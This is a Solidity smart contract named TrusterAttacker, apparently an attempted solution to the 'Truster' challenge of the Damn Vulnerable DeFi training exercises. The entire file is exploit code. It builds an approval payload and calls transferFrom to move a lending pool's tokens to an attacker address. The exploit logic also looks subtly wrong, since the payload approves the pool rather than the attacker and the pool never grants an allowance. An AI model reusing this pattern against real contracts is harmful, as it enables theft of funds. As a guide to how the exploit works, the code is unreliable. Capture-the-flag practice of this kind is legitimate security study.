pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TrusterAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    IERC20 public damnValuableToken;
    address private poolAddress;
    uint256 private approveAmount;

    constructor(address tokenAddress, address poolAddr, uint256 approve) public {
        damnValuableToken = IERC20(tokenAddress);
        poolAddress = poolAddr;
        approveAmount = approve;
    }

    function getPayload() public returns (bytes memory) {
        return abi.encodeWithSignature("approveLimit()");
    }
    
    function approveLimit() public {
        damnValuableToken.approve(poolAddress, approveAmount);
    }

    function moveLimit(address attacker) public {
        damnValuableToken.transferFrom(poolAddress, attacker, approveAmount);
    }
}